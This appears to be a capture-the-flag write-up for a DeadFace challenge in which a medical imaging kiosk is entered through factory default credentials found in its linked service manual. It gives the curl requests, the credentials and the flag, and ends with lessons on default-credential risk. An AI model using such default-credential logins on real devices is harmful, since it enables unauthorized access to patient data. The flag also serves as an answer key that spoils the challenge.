# Bedside Manner — DeadFace CTF (Challenge #15)

**Category:** Medical Device / Web
**Target:** http://emedra.dctf.io:8080/
**Creator:** @syNTAX

## Summary

The Emedra CerebraScan CS-9000 kiosk ships with a factory technician account.
The credentials are documented in the device's Field Service Manual PDF, which
is linked from the asset label hotspot. Signing in with these defaults returns a
maintenance token — the lingering developer string left in the kiosk.

## Steps

1. Query the asset label hotspot to find the field service manual link:

   ```
   curl http://emedra.dctf.io:8080/api/hotspot/sticker
   ```

   Response includes: `"link":{"href":"/assets/cs9000-field-service-manual.pdf", ...}`

2. Download and read the manual (Section 2.3 — Default technician account):

   ```
   curl -O http://emedra.dctf.io:8080/assets/cs9000-field-service-manual.pdf
   ```

   ```
   Username:  emedra-svc
   Password:  ChangeMe!2019
   ```

3. Authenticate to the kiosk with the factory credentials:

   ```
   curl -X POST http://emedra.dctf.io:8080/api/kiosk/auth \
     -H "Content-Type: application/json" \
     -d '{"username":"emedra-svc","password":"ChangeMe!2019"}'
   ```

4. The response contains the lingering maintenance token — this is the flag:

   ```json
   {"ok":true,"token":"318736bc-...","tech":{"name":"Service Technician"},
    "maintenanceToken":"deadface{d3fault_cr3ds_n3v3r_ch4ng3d}"}
   ```

5. (Optional) Verify the session token works:

   ```
   curl http://emedra.dctf.io:8080/api/kiosk/patients -H "Authorization: Bearer <token>"
   ```

## Flag

```
deadface{d3fault_cr3ds_n3v3r_ch4ng3d}
```

## Lessons

- Factory default credentials shipped with a device are a critical risk,
  especially when documented in publicly accessible manuals.
- Maintenance tokens returned at login should be short-lived and
  tightly scoped — this one was a static, long-lived credential.
